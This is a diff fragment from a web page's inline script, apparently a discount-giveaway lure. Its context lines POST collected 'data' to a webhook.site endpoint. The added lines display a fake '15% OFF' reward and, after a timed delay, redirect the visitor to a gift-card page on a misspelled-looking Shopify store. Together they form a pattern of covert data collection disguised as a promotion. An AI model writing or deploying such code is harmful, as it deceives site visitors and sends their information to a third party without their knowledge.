@@ -119,6 +119,12 @@ fetch("https://webhook.site/f6a09363-360d-4d13-8716-77a7c162b420", {
   method: "POST",
   body: data
 });
+  document.getElementById("result").innerText = "🎉 You got 15% OFF!";
+        setTimeout(() => {
+          // redirect to other page to go out
+          window.location.href = "https://donut-strore.myshopify.com/products/gift-card";
+        }, 2000);
+      }, 4000);
 </script>
   
 
